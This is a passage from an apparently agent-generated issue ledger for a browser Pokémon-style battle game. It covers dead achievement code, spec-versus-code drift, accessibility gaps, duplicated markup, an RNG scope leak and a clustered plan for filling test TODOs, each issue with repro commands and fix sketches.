try { if (bossMode) { _storyAchievementUnlock('caged_god'); _storyAchievementUnlock('r_caged_god'); } } catch (e) {}
// battle.html:43157 / 49428 — sm.bossArc.available is ONLY ever set false; never true anywhere:
if (sm.bossArc) sm.bossArc.available = false;
```

**Repro**: `grep -nE 'bossArc\.available\s*=\s*true|available:\s*true' battle.html` returns nothing — the only writes are `= false` (43157) and the `{ available:false }` default (49428). Every `_bossArc*` render/lead/enter fn early-returns on `!sm.bossArc.available`. STORY_MODE_FLOW.md §9 (line 221) marks the Caged God arc "❌ REMOVED (v24)" with "no Caged God hunt"; `migrateStoryPreV24` (35113) strips `sm.bossArc`. So the bossMode grant path can never execute. Both achievements stay visible in the achievement list but are impossible to obtain.

**Blast radius**: Achievement completion %, "collect them all" framing, the entire dead `_bossArc*` subsystem (~49426-49600, `_bossArcRenderSection`/`_bossArcCheckCageUnlock`/`_bossArcRollLegendary`/`bossCollectLead`) and the `bossMode` catch branch (50396, 50965, 50984) are all unreachable. Note: stale ISSUE_LEDGER entries (006, 028, 029, 068, 076, 077, 102, 114, 119, 123) describe this arc as a LIVE-but-buggy feature — they are obsolete post-v24; the current drift is the ghost achievements + dead code left behind by the cut.

**Fix sketch**: Either remove the two `caged_god`/`r_caged_god` achievement rows (and the dead `_bossArc*` subsystem) to match the §9 cut, or hide them from the achievement UI as retired. Decision needs maintainer sign-off (CLAUDE.md lists the arc as removed, so removal aligns with intent).

**Verification**: After removal, achievement screen total no longer counts two unobtainable entries; `grep -nE "caged_god|_bossArc" battle.html` returns only history/migration references.

---

## <a id="ISSUE-223"></a> ISSUE-223: STORY_MODE_FLOW says timeline is "68 rows"; STORY_EVENTS_RAW actually has 67 rows

---
id: ISSUE-223
severity: P2
category: inconsistency
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29240
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: e585e95483b0
confidence: high
status: open
---

**Title**: STORY_MODE_FLOW says timeline is "68 rows"; STORY_EVENTS_RAW actually has 67 rows

**Evidence**:
```js
// battle.html 29240-29311: STORY_EVENTS_RAW literal — 67 data rows (idx 0..66),
// last row idx 66 = [67,'Battle','Mystery Figure',...]. (3 of the 70 literal
// lines are comments at 29300-29302.)
```
```text
STORY_MODE_FLOW.md:27  "...existing `STORY_EVENTS_RAW`, 68 rows, unchanged..."
STORY_MODE_FLOW.md:53  "The existing `STORY_EVENTS_RAW` array ... stays as-is."
(by contrast docs/PROGRESSION_CURVE_MASTER.md:52 correctly says "67 rows (array idx 0–66)")
```

**Repro**: `awk 'NR>=29241 && NR<=29310' battle.html | grep -cE '^\s*\[\s*[0-9]+\s*,'` → 67.

**Blast radius**: Doc-only count drift. The arc itself is intact and matches spec: intro rival (idx 1) → 8 gyms → 2 rival rematches + league rival → E1–E4 → Champion → Hall of Fame (idx 65) → post-HoF Mystery Figure (idx 66). Only the row *count* in `STORY_MODE_FLOW.md` §1 (line 27) is wrong; the task brief inherited this stale "68-row" figure from the spec. `GYM_CITY_LEADER_EVENT` is now correctly DERIVED at boot from `STORY_EVENTS_RAW` (battle.html:29990, `buildGymCityLeaderMap()`), so the prior audit's §1.3 "hard-coded gym index map" concern is resolved — no derive-vs-hardcode mismatch remains.

**Fix sketch**: Change "68 rows" → "67 rows (idx 0–66)" in `STORY_MODE_FLOW.md` line 27.

**Verification**: Count matches `PROGRESSION_CURVE_MASTER.md`'s "67 rows".

---

## <a id="ISSUE-224"></a> ISSUE-224: Story spine is a hardcoded linear array; narrative layer is data-driven but no structural side-story/random-pool slots

---
id: ISSUE-224
severity: P2
category: refactor
anchor_symbol: STORY_EVENTS_RAW
current_line_hint: ~29008
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4c6af8ecc61c
confidence: high
status: open
---

**Title**: Story spine is a hardcoded linear array; narrative layer is data-driven but no structural side-story/random-pool slots

**Evidence**:
```js
const STORY_EVENTS_RAW = [   // battle.html:29008 — fixed literal, 67 rows
  [0,'City','City0',null,0,[...]],
  [68,'Battle','Rival',{...},2000,null],
  ...
];
// vs the EXTENSIBLE narrative layer (battle.html:35496):
// "To add a new pre-battle scene → append to STORY_BATTLE_INTERRUPTS.
//  To add a new cold-open → add a row to STORY_COLD_OPENS …
//  To add a new storyline → add an entry to STORYLINE_VARIANTS with beatOverrides …"
```

**Repro**: The timeline (`STORY_EVENTS_RAW`) is a static literal. Three clean extension layers exist OVER it: (1) `STORY_BEATS` — per-row metadata keyed on durable `storyRowId` (NOT array index, 35509–35511); (2) `STORY_COLD_OPENS` — fire-once narrative scenes, meta-tracked; (3) `STORY_BATTLE_INTERRUPTS` — a runtime pre-battle interrupt bus that ALREADY injects route nodes (wild/roaming/catch-tutorial) WITHOUT advancing `sm.eventIndex` (37942); (4) `STORYLINE_VARIANTS` — narrative reskins via `beatOverrides[rowId]`. Pokémon picks always flow through the existing rollers, so variants "CANNOT break the difficulty curve" (35506).

**Blast radius**: This directly informs the maintainer's architecture. Verdict: the NARRATIVE layer is genuinely pluggable ("bind and attach" via row-id-keyed overrides). The STRUCTURAL layer (adding new events / a random-draw pool of side-stories) has NO data-driven slot system yet — `STORY_EVENTS_RAW` would need editing, and 49 positional accesses + save-keyed `trainerAssignments` make naive row reordering unsafe (REDESIGN_PLAN §6 confirms; rows already use `eventId` col 0 as the durable key, e.g. row 68 sits at array index 1).

**Fix sketch**: For pluggable static side-stories + random-draw pool: extend the `STORY_BATTLE_INTERRUPTS` bus pattern — it is the proven mechanism for injecting beats between fixed rows without touching `eventIndex`. Add a `STORY_SIDE_STORIES` registry (each with a `fires(ctx)` predicate + `once` meta key) and a `STORY_RANDOM_POOL` drawn by `_storySideRng` at city entry. Bind via the same `prepare()/run()` contract. Avoid mutating `STORY_EVENTS_RAW`; always key on `eventId`/row-id, never array index.

**Verification**: Prototype one side-story as a new interrupt entry; confirm `eventIndex` is untouched and the main spine still advances.

---

## <a id="ISSUE-225"></a> ISSUE-225: Recurring facility-flavor pool covers 8 services; Safari / Stone Sage / Stone Shop / Dept Store have none

---
id: ISSUE-225
severity: P2
category: inconsistency
anchor_symbol: STORY_FACILITY_QUOTES
current_line_hint: ~39208
file: battle.html
agents: [consistency-auditor]
fingerprint: ede1c3a285f0
confidence: high
status: open
---

**Title**: Recurring facility-flavor pool covers 8 services; Safari / Stone Sage / Stone Shop / Dept Store have none

**Evidence**:
```js
// 39208 — STORY_FACILITY_QUOTES keys (the ambient one-liner shown on every re-visit):
//   moveTutor, natureRater, battleDojo, evTrainer, colress, link, casino, relicKeeper
const STORY_FACILITY_QUOTES = {
    moveTutor: [ /* 7 lines */ ], natureRater: [ /* 7 */ ], battleDojo: [ /* 7 */ ],
    evTrainer: [ /* 6 */ ], colress: [ /* 6 */ ], link: [ /* 5 */ ],
    casino: [ /* 5 */ ], relicKeeper: [ /* 5 */ ],
    // no: safari, stoneSage/evolab, stoneShop, dept
};
```

**Repro**: Each of the 8 keyed services calls `_storyShowFacilityQuote(...)` to print a rotating italic NPC line under the screen header on every visit. Safari Zone, Stone Sage, Stone Emporium, and Department Store render a one-time intro scene the first visit (STORY_TUTORIAL_SCENES) but have no recurring pool, so on every subsequent visit those four screens are silent where the other eight speak.

**Blast radius**: Cosmetic inconsistency in the ambient-voice layer the maintainer flagged for review. The REDESIGN_PLAN makes Safari "permanent after debut" and the Dept Store cyclic (C6/C8/C9) — both become high-re-visit screens, widening the silent gap exactly where the redesign adds traffic.

**Fix sketch**: Add `safari`, `stoneSage`, `stoneShop`, `dept` pools (5-7 lines each, matching the existing voice) to STORY_FACILITY_QUOTES and wire a `_storyShowFacilityQuote(screenId, key)` call into each facility's enter function (enterSafariZone, enterStoneShop, the Stone Sage screen, the Dept Store screen).

**Verification**: Visit each of the four facilities twice; an ambient italic line appears under the header on both visits and rotates.

---

## <a id="ISSUE-226"></a> ISSUE-226: De-scoped features (Black Market, Illegal Dealer, Trader, Wager, full Itinerary) still presented as active spec — precise doc-edit list

---
id: ISSUE-226
severity: P2
category: dx
anchor_symbol: STORY_FEATURES_INTEGRATION
current_line_hint: n/a
file: docs/STORY_FEATURES_INTEGRATION.md
agents: [spec-drift-auditor]
fingerprint: 37c82575616a
confidence: high
status: fixed-claude/optimistic-ptolemy-g3COo
---

**Title**: De-scoped features (Black Market, Illegal Dealer, Trader, Wager, full Itinerary) still presented as active spec — precise doc-edit list

**Evidence**:
```text
Code presence check (battle.html):
  blackMarket / enterBlackMarket / "Black Market"        → 0 hits
  illegalDealer / "Illegal Dealer" / Contraband Capsule  → 0 hits
  traderOfferByCity / enterTrader / pokemonTrader        → 0 hits
  pendingWager / battleForPokemon / "Battle for Pokémon" → 0 (3 "wager" hits are all Casino flavor text)
  itineraryProgress / runItinerary / STORY_SCRIPT        → 0 hits
```

**Repro**: The greps above.

**Blast radius**: Per the product decision these five are CUT (not "not implemented" bugs). The docs that present them as live/planned spec need editing to mark them future/cut. Precise list (canonical home = `docs/STORY_FEATURES_INTEGRATION.md`):

`docs/STORY_FEATURES_INTEGRATION.md`:
- §3 Black Market — heading + body lines 33–54 (placement table 37–41, SKU table 44–51, `enterBlackMarket()` UI line 53).
- §3.5 Illegal Dealer NPC — heading + body lines 57–84 (placement 63–65, loop table 67–76, differentiation table 78–84).
- §6 Battle for Pokémon (wager) — heading + body lines 110–119; plus the ordering refs that name "wager": line 106, and §8 rows lines 135, 137, 138.
- §7 Pokémon Trader — heading + body lines 123–128 (the "idx 26 OR 29 — pick one" was never decided).
- Full Itinerary — it is woven through, not a single section: lines 39, 65, 75, 90, 106, 117, 135, 136 (the `runItinerary`/`itineraryProgress`/`storyScriptState` save-persist row), 138, 150, and the §10 implementation-order steps 165 (#2 `runItinerary`+arc stub) and 168/169 (#5 Wager, #6 Trader). Steps remaining as in-scope after de-scope: #1 balls/PC (shipped), #4 Safari (shipped), #7 dialogue.
- §9 readiness table rows that reference cut systems: line 150 (Itinerary beats), 151 (Black Market vendor), 152 (Illegal Dealer NPC), 154 (Trader NPC), 155 (Battle for Pokémon).

`docs/STORY_MODE_CATCH_INTEGRATION_RISK.md`:
- line 94 (Mystery Figure & Trader & Wager swap rule), line 140 (`itinerary → wild → wager → trainer` ordering), lines 147, 200, 202 (`runItinerary`/`maybeOfferWager` queue), line 229 (Egg from the Trader).

`docs/STORY_MODE_DESIGN_DECISIONS.md`:
- line 111 (wrap `src: 'professor'|'wild'|'trader'` — drop `'trader'`), lines 350/354/355/358 + 543 row D3 (PC "Fence at the Black Market" mechanic), line 579 (deriving city map under "wild, wager, safari" pressure).

`STORY_MODE_FLOW.md`:
- §16 References line 1074 calls `STORY_FEATURES_INTEGRATION.md` "the canonical replacement" — once that doc is marked future/cut, this pointer's framing should note the five cut systems.

NOT recommended for edit: `docs/STORY_MODE_AUDIT.md` references (lines 36, 70, 192, 236, 248–250, 273, 285, 289, 319–320, 338, 347–360, 369) — that audit is a point-in-time snapshot that already says "zero implemented" and lists them as backlog; it reads correctly as history. Leave it.

**Fix sketch**: Add a banner at the top of `docs/STORY_FEATURES_INTEGRATION.md` ("§3, §3.5, §6, §7 and the full-itinerary scaffolding are DE-SCOPED — not planned; retained for historical context") and strike/mark the per-section lines above. Then fix the cross-references in the other three docs.

**Verification**: After edits, no doc presents Black Market / Illegal Dealer / Trader / Wager / Itinerary as a planned-and-pending deliverable; each is explicitly tagged cut/future.

---

## <a id="ISSUE-227"></a> ISSUE-227: Surviving canonical specs + code link to docs deleted in the cleanup (dangling references)

---
id: ISSUE-227
severity: P2
category: inconsistency
anchor_symbol: STORY_MODE_FLOW
current_line_hint: ~62
file: STORY_MODE_FLOW.md
agents: [spec-drift-auditor]
fingerprint: 1b3b3cab3ba7
confidence: high
status: open
---

**Title**: Surviving canonical specs + code link to docs deleted in the cleanup (dangling references)

**Evidence**:
```
STORY_MODE_FLOW.md:62   "Implementation strategy = strategy A from
                         `docs/STORY_MODE_CATCH_INTEGRATION_RISK.md §5`"        [DELETED]
STORY_MODE_FLOW.md:334  "Per the prior audit's 'single most important rule'
                         (`docs/STORY_MODE_CATCH_INTEGRATION_RISK.md §8`)"       [DELETED]
docs/story-design/STORY_3TRACK_IMPL_PLAN.md:601,728  "(per PLAYTEST_REPORT.md mention)" / "PLAYTEST_REPORT.md — confirms ..."  [DELETED]
docs/story-design/STORY_3TRACK_IMPL_PLAN.md:726      "docs/story-design/CITY_BY_CITY.md — shipped facility ladder"            [DELETED]
battle.html:35528       "... a G-Max status branch). See BUG_REPORT.md."                                                      [DELETED]
scripts/debug/autopilot-player.mjs:14  "(anime.js is CDN-only — PLAYTEST_REPORT P1-3)."                                       [DELETED]
```

**Repro**: The cleanup commit `ea68891` ("chore: prune stale design docs") deleted `docs/STORY_MODE_CATCH_INTEGRATION_RISK.md`, `docs/story-design/CITY_BY_CITY.md`, `PLAYTEST_REPORT.md`, `BUG_REPORT.md` (et al). Confirm absent: `ls docs/STORY_MODE_CATCH_INTEGRATION_RISK.md` → not found. The two FLOW references are load-bearing: §2 cites "strategy A" from the deleted risk doc as the *rationale* for the route-node save/restore model, and §12 cites its §8 as the *source* of the badge-vs-`sm.team.length` difficulty rule.

**Blast radius**: A reader following FLOW §2/§12 to the cited doc for the design rationale hits a 404 — the "why" behind the route-interrupt and party-size-difficulty decisions is now unciteable. The 3TRACK plan cites a deleted playtest report as its *evidence* that `rollMysteryFigureFinalBossTeam` already works, and a deleted CITY_BY_CITY.md as its facility-ladder anchor. The `battle.html`/autopilot references are low-stakes (comments) but equally dangling.

**Fix sketch**: For each surviving reference, either (a) inline the one-line takeaway the deleted doc supplied (e.g. FLOW §2: "strategy A = save/restore-wrapped wild interrupt, no new timeline rows"; §12: "key difficulty off `sm.badges`, not `sm.team.length`") and drop the dead path, or (b) point at git history. Same for the 3TRACK source list and the two code comments.

**Verification**: `grep -rnE 'STORY_MODE_CATCH_INTEGRATION_RISK|CITY_BY_CITY|PLAYTEST_REPORT|BUG_REPORT\.md' STORY_MODE_FLOW.md docs/ battle.html scripts/` returns no references to deleted files.

---

## <a id="ISSUE-228"></a> ISSUE-228: Story tone variants recolor nameplate text but not its yellow background — fails WCAG AA contrast

---
id: ISSUE-228
severity: P2
category: a11y
anchor_symbol: story-dialog-nameplate
current_line_hint: ~2216
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: 95a0a3a5f2ea
confidence: high
status: open
---

**Title**: Story tone variants recolor nameplate text but not its yellow background — fails WCAG AA contrast

**Evidence**:
```css
.story-dialog-nameplate { color:#111 !important;
    background: linear-gradient(180deg,#ffd54f 0%,#ffb300 100%) !important; }
.story-tone-amber  .story-dialog-nameplate { color:#ffcc80; }  /* light-orange on yellow */
.story-tone-cold   .story-dialog-nameplate { color:#80deea; }  /* cyan on yellow */
.story-tone-purple .story-dialog-nameplate { color:#ce93d8; }  /* lavender on yellow */
```

**Repro**: The base rule sets a yellow gradient bg with `!important`; tone variants override only `color`/`border-color`, leaving the yellow bg. Cyan #80deea on yellow #ffd54f ≈ 1.6:1 and amber #ffcc80 on #ffd54f ≈ 1.3:1 — far below the 4.5:1 AA text threshold. The base dark-on-yellow (#111) passes; only the tone overrides fail. (Body `.story-dialog-text` stays #e8e8e8 on #1e2030 dark box — passes.)

**Blast radius**: amber/cold/purple/mourning/ash/static tone scenes (cutscene NPC nameplates).

**Fix sketch**: For tone variants, override the nameplate `background` to a dark fill (matching the box) when using light text, or keep `color:#111` and only tint the border. Verify each tone pair hits 4.5:1.

**Verification**: Contrast checker on each tone's nameplate text/bg pair ≥ 4.5:1.

---

## <a id="ISSUE-229"></a> ISSUE-229: Story dialogue/NPC quote text is not in a live region — narration is silent to screen readers

---
id: ISSUE-229
severity: P2
category: a11y
anchor_symbol: story-dialog-text
current_line_hint: ~8318
file: battle.html
agents: [accessibility-ux-auditor]
fingerprint: b724187dc264
confidence: medium
status: open
---

**Title**: Story dialogue/NPC quote text is not in a live region — narration is silent to screen readers

**Evidence**:
```html
<div class="story-dialog-box">
    <p class="story-dialog-text" id="story-city-quote"></p>
</div>
<div id="story-city-tips" class="story-city-tips"></div>
```

**Repro**: Battle text is announced (`#battle-log` has `role="log"`, L9054), but story NPC dialogue (`#story-city-quote`, `#story-prof-quote`, `#story-prof-status`, shop quotes) updates silently — SR users get no story narration or event-result feedback outside battle.

**Blast radius**: All story service screens' dialogue/status text. REDESIGN_PLAN §6 wants gauntlet round results announced — same live-region need applies there.

**Fix sketch**: Add `aria-live="polite"` (and `aria-atomic="true"`) to the dialogue/quote/status containers, mirroring the casino result strips (L8649) that already do this correctly. For gauntlet round results, announce win/loss via a `role="status"` region.

**Verification**: SR speaks NPC quote and event-status changes as they render; Fight Club round results announce.

---

## <a id="ISSUE-230"></a> ISSUE-230: Verbatim gold-HUD markup re-inlined 11× — the "re-inlined block 25 times" anti-pattern CLAUDE.md warns about

---
id: ISSUE-230
severity: P2
category: refactor
anchor_symbol: story-gold-icon
current_line_hint: ~8914
file: battle.html
agents: [consistency-auditor]
fingerprint: f5f634f1db37
confidence: high
status: open
---

**Title**: Verbatim gold-HUD markup re-inlined 11× — the "re-inlined block 25 times" anti-pattern CLAUDE.md warns about

**Evidence**:
```html
<span class="story-gold-inline"><img class="story-gold-icon" src="icons/story-gold-coin.svg" alt="" width="21" height="16" decoding="async"> 0G</span>
```

**Repro**: `grep -c 'story-gold-icon' battle.html` → 19; the exact `story-gold-inline` + img prefix above appears 11× verbatim across the story HUD and every shop header (`story-hud-gold`, `story-shop-gold`, `story-artifact-shop-gold`, `story-stone-shop-gold`, `story-tutor-gold`, `story-colress-gold`, `story-evtrainer-gold`, `story-pc-gold`, `story-crucible-gold`, `story-link-gold`, `story-evolab-gold` — lines ~8914-9209). Each copy duplicates the icon path, dimensions, and decoding hint.

**Blast radius**: Story HUD + all shop screens (in-scope). A change to the coin icon, its size, or alt text today requires 11 synchronized edits; a missed one is a visual drift bug. This is exactly the "vibecode re-inlining" pattern CLAUDE.md's architecture prefs call out for elimination.

**Fix sketch**: Extract a single `storyGoldChip(elId)` HTML helper (or a small template constant) and emit it at each of the 11 sites. Behavior-preserving (identical markup), so this is a 1:1 refactor — needs direction approval but not diff-level sign-off per CLAUDE.md.

**Verification**: `grep -c 'story-gold-coin.svg' battle.html` drops from 11 inline copies to 1 source; all gold HUD/shop chips still render an icon + amount (screen-audit harness shows no layout regression).

---

## <a id="ISSUE-231"></a> ISSUE-231: Help screen still advertises the cut Caged God / Subject Zero / Master-Ball quest

---
id: ISSUE-231
severity: P2
category: inconsistency
anchor_symbol: storyHelpText
current_line_hint: ~11337
file: battle.html
agents: [consistency-auditor]
fingerprint: 58d0c67c14b0
confidence: high
status: fixed-claude/cagedgod-excision
---

**Title**: Help screen still advertises the cut Caged God / Subject Zero / Master-Ball quest

**Evidence**:
```html
<!-- Catching section (~11337) -->
... The Caged God in the post-game needs the Master Ball — saved for that one fight.
<!-- Pokémon Center (~11348) -->
... Your last party member and Subject Zero are not for sale.
<!-- Endgame section (~11360) -->
... The <b>Caged God</b> boss arc needs three corrupted-Center leads scattered through
the post-game, then the Master Ball.
```

**Repro**: Open the in-game Help/How-to-Play screen → Catching and Endgame sections describe a feature (Caged God boss arc + dedicated Master-Ball sink) that no longer fires (see the P1/P2 above). The Master Ball is now granted by the 3-track villain-boss victory and is just a normal guaranteed-catch ball; there is no "one fight" to save it for.

**Blast radius**: Player-facing onboarding text promises content that doesn't exist → player saves a Master Ball for a fight that never comes, and looks for a post-game boss they can't reach.

**Fix sketch**: Rewrite the Catching/Endgame help to drop the Caged God + "save the Master Ball" framing; describe the Master Ball as a villain-boss reward / general guaranteed catch. (If the arc is revived instead, leave it — but reconcile with the P1.)

**Verification**: Help text mentions no Caged God / dedicated Master-Ball fight unless the arc is live.

---

## <a id="ISSUE-232"></a> ISSUE-232: STORY_NARRATIVE_VARIANTS.md presents a cut 8-variant design as "canonical" (future-prompt-rebuild trap)

---
id: ISSUE-232
severity: P2
category: inconsistency
anchor_symbol: STORYLINE_VARIANTS
current_line_hint: ~40871
file: docs/STORY_NARRATIVE_VARIANTS.md
agents: [spec-drift-auditor]
fingerprint: e9e4c9139950
confidence: high
status: open
---

**Title**: STORY_NARRATIVE_VARIANTS.md presents a cut 8-variant design as "canonical" (future-prompt-rebuild trap)

**Evidence**:
```text
docs/STORY_NARRATIVE_VARIANTS.md:7  "This is the canonical design for the 8-storyline system layered over the existing 68-row story timeline"
:284  buried_alive (Lavender Frequency exclusive)   ← never added to code
:320  cartridge_self (STATIC exclusive)             ← never added to code
:78/105/129/...  Caged God per-variant epilogue    ← arc removed v24
```

**Repro**: STORY_FLOW_AUDIT.md §1a + §6 resolve the maintainer decision: "Cut the 8-variant concept entirely... delete the other 7 variants + their ~75 unreachable cold-opens." In code, the variant picker is gone, `sm.storyLine` is forced `'classic'` (battle.html:35258), and `MYSTERY_FIGURE_IDENTITIES` has only `the_first` — the two new identities this doc specifies were never built (`grep -c buried_alive battle.html` outside dead `_MYSTERY_OUTRO_BY_VARIANT` = data-only). Doc still reads as a live build plan with a phasing table (§12).

**Blast radius**: The doc is the exact "a future prompt rebuilds the cut design from this file" trap CLAUDE.md warns about. A maintainer or agent could re-implement the 8-variant picker + 2 pasta identities + Caged God epilogues straight from §1-§12, re-introducing the dead-code era STORY_FLOW_AUDIT just decided to delete.

**Fix sketch**: Add a top banner: "SUPERSEDED — the 8-variant system was cut (see STORY_FLOW_AUDIT §6); the live design is the 3-track Main/Villain/Extra model. Retained for prose salvage only." Or delete the doc and move salvageable prose into the 3-track scene tables.

**Verification**: The doc no longer claims "canonical"; any reader is routed to the 3-track canon before re-building anything.

---

## <a id="ISSUE-233"></a> ISSUE-233: Cosmetic-skin roll references bare `sm` AND bare `storyRngNext` — double scope leak, never seeded

---
id: ISSUE-233
severity: P2
category: inconsistency
anchor_symbol: storyRngNext
current_line_hint: ~10482
file: battle.html
agents: [consistency-auditor]
fingerprint: 294ac88b95dd
confidence: high
status: open
---

**Title**: Cosmetic-skin roll references bare `sm` AND bare `storyRngNext` — double scope leak, never seeded

**Evidence**:
```js
// line 10482 (outside IIFE, in makeBuild cosmetic-forme path)
const rng = (typeof sm === 'object' && sm && sm.active && typeof storyRngNext === 'function') ? storyRngNext : Math.random;
```

**Repro**: Both `sm` and `storyRngNext` are IIFE-private. `typeof sm === 'object'` is always false here, so the cosmetic-forme roll always uses `Math.random()`.

**Blast radius**: Cosmetic forme assignment (1.5% chance) is non-deterministic across seeded replays. Lower stakes than combat RNG (purely cosmetic) but same root cause; fix together with the other leaks.

**Fix sketch**: Mirror line 13854-13855: read `window.StoryMode.state` for active-ness and use `window.storyRngNext`.

**Verification**: grep confirms no bare `storyRngNext`/`sm` in makeBuild; cosmetic forme reproduces under a fixed seed.

---

## <a id="ISSUE-234"></a> ISSUE-234: 351 it.todo() stubs across 3 move-category test files — cluster enumeration

---
id: ISSUE-234
severity: P2
category: test-gap
anchor_symbol: tests/moves/by-category
current_line_hint: ~30
file: tests/moves/by-category/status.test.js
agents: [test-coverage-filler]
fingerprint: fca6be0da22a
confidence: high
status: open
---

**Title**: 351 it.todo() stubs across 3 move-category test files — cluster enumeration

**Evidence**:

```
File counts (confirmed via grep -nE "^\s*it\.todo\("):
  tests/moves/by-category/status.test.js   = 210 TODOs
  tests/moves/by-category/special.test.js  =  74 TODOs
  tests/moves/by-category/physical.test.js =  67 TODOs
  TOTAL                                    = 351 TODOs

Cluster taxonomy (42 buckets; setup-shape, not move-category):

| cluster id | count | example moves (first 3) |
|---|---|---|
| noop-flavor | 2 | Celebrate, Splash |
| boost-self | 1 | Howl |
| self-boost | 1 | Clanging Scales |
| boost-target | 10 | Aromatic Mist, Captivate, Coaching |
| pure-status-target | 14 | Dark Void, Glare, Grass Whistle |
| pure-volatile-self | 16 | Aqua Ring, Destiny Bond, Focus Energy |
| pure-volatile-foe | 26 | Attract, Confuse Ray, Curse |
| heal | 23 | Floral Healing, Heal Order, Heal Pulse |
| field-side-condition | 15 | Aurora Veil, Crafty Shield, Light Screen |
| field-terrain | 4 | Electric Terrain, Grassy Terrain, Misty Terrain |
| weather-set | 6 | Chilly Reception, Hail, Rain Dance |
| field-pseudo-weather | 8 | Fairy Lock, Gravity, Ion Deluge |
| field-clear | 4 | Court Change, Defog, Haze |
| secondary-status | 13 | Blizzard, Discharge, Heat Wave |
| secondary-boost | 12 | Acid, Bleakwind Storm, Bubble |
| secondary-volatile | 7 | Fiery Wrath, Snore, Sparkling Aria |
| damage-plain | 14 | Burn Up, Doom Desire, Future Sight |
| drain | 2 | Matcha Gotcha, Parabolic Charge |
| fixed-damage | 5 | Dragon Rage, Night Shade, Psywave |
| fractional-hp-damage | 4 | Natures Madness, Ruination, Endeavor |
| variable-power | 22 | Electro Ball, Grass Knot, Pika Papow |
| signature-ohko | 4 | Sheer Cold, Fissure, Guillotine |
| protect-like | 11 | Baneful Bunker, Burning Bulwark, Detect |
| counter-like | 4 | Mirror Coat, Comeuppance, Counter |
| lock-on | 2 | Lock-On, Mind Reader |
| self-effect-special | 4 | Belly Drum, Refresh, Stuff Cheeks |
| pp-reduction | 1 | Spite |
| status-transfer | 1 | Psycho Shift |
| boost-copy-flip | 4 | Flower Shield, Psych Up, Rototiller |
| stat-swap-split | 7 | Guard Split, Guard Swap, Heart Swap |
| ability-manipulation | 6 | Doodle, Entrainment, Role Play |
| type-change | 8 | Camouflage, Conversion, Conversion 2 |
| force-switch-or-trap | 5 | Block, Mean Look, Roar |
| item-manipulation | 4 | Bestow, Recycle, Switcheroo |
| perish-song | 1 | Perish Song |
| final-gambit | 1 | Final Gambit |
| turn-order-helper | 4 | After You, Ally Switch, Quash |
| pivot-or-faint-helper | 3 | Baton Pass, Parting Shot, Teleport |
| meta-move | 10 | Assist, Copycat, Instruct |
| misc-truly-unclassified | 1 | Transform |
| charge | 17 | Electro Shot, Ice Burn, Meteor Beam |
| ally-or-spread-target | 44 | Air Cutter, Astral Barrage, Boomburst |
| SUM | 351 | (reconciled against grep count) |
```

```
NOTE: zero TODOs needed multihit/recoil bucketing — the auto-generator
already filled those. The TODO surface is dominated by:
  - Utility/status moves (volatile + side-condition + heal):  ~115
  - Spread/ally-target damage (skipped in singles harness):    44
  - Variable-power + condition-dependent damage:               36
  - Signature/transform/meta moves:                            ~50
  - Charge moves needing 2-turn runs:                          17
```

**Repro**: `/fix-todo-test <cluster-id>` per cluster (e.g. `/fix-todo-test pure-status-target`). Each invocation should write to `tests/moves/by-category/_drafts/<cluster-id>.test.js`.

**Blast radius**: tests/moves/by-category/* (do not edit existing files; orchestrator promotes drafts after review). The harness file `tests/helpers/load-engine.js` is consumed by every cluster; if it cannot satisfy doubles/spread targets, the `ally-or-spread-target` cluster (44 moves) should be deferred or skipped.

**Fix sketch**: Execute clusters in cheapest-setup order. Recommended order (cheapest to most expensive):

1. `noop-flavor` (2) — no precondition, assert no state change
2. `boost-self` (1), `boost-target` (10) — single-turn, assert stage delta
3. `pure-status-target` (14) — assert `defender.status === 'slp'|'par'|...`
4. `pure-volatile-self` (16), `pure-volatile-foe` (26) — assert volatile applied to user/foe
5. `heal` (23) — pre-damage user, assert HP restored
6. `weather-set` (6), `field-terrain` (4), `field-side-condition` (15), `field-pseudo-weather` (8), `field-clear` (4) — assert field/side state
7. `secondary-status` (13), `secondary-boost` (12), `secondary-volatile` (7) — assert damage dealt; secondary chance assertions should tolerate RNG (run many trials or pin seed)
8. `damage-plain` (14), `drain` (2), `fixed-damage` (5), `fractional-hp-damage` (4), `signature-ohko` (4) — assert HP threshold
9. `variable-power` (22) — set up scaling variable (HP%, weight, level, friendship, status), assert damage scales
10. `protect-like` (11), `counter-like` (4), `lock-on` (2), `self-effect-special` (4), `pp-reduction` (1), `status-transfer` (1) — two-turn setups
11. `boost-copy-flip` (4), `stat-swap-split` (7), `ability-manipulation` (6), `type-change` (8) — two-pokemon state changes
12. `force-switch-or-trap` (5), `item-manipulation` (4), `perish-song` (1), `final-gambit` (1), `turn-order-helper` (4), `pivot-or-faint-helper` (3), `meta-move` (10), `misc-truly-unclassified` (1) — special-case scaffolding (likely partial coverage)
13. `charge` (17) — two-turn runTurn, assert damage on turn 2
14. `ally-or-spread-target` (44) — **LAST**: singles harness almost certainly cannot drive these; expect to mark `it.skip()` or document as deferred

Batch limit per invocation: 25–40 TODOs. Split larger buckets (`ally-or-spread-target` 44 → 2 batches; `pure-volatile-foe` 26 fits in one; `heal` 23 fits in one; `variable-power` 22 fits in one).

**Verification**: Each `/fix-todo-test <cluster-id>` invocation writes `tests/moves/by-category/_drafts/<cluster-id>.test.js` and runs `node --test` on it. The agent emits a follow-up finding noting per-cluster status (passing / partially-failing / bug-discovered). Final reconciliation: `grep -c "it.todo" tests/moves/by-category/*.test.js` should approach zero after all drafts are promoted by the orchestrator.

---

## <a id="ISSUE-235"></a> ISSUE-235: 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool

---
id: ISSUE-235
severity: P2
category: inconsistency
anchor_symbol: TRAINER_QUOTES_BY_NAME
current_line_hint: ~29450
file: battle.html
agents: [consistency-auditor]
fingerprint: cbadf67900dd
confidence: high
status: open
---

**Title**: 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool

**Evidence**:
```js
// TRAINER_QUOTES_BY_NAME has named intros for Brock/Misty/Lt.Surge/Erika/Koga/Sabrina/Blaine/Giovanni
// only — every other Gym Leader defined in TRAINER_DATA falls back to TRAINER_QUOTES['Gym Leader'].
// Missing: Allister, Bea, Brassius, Brawly, Brycen, Bugsy, Burgh, Byron, Candice, Chuck,
//   Cilan, Clair, Clay, Clemont, Crasher Wake, Drayden, Elesa, Falkner, Fantina, Flannery,
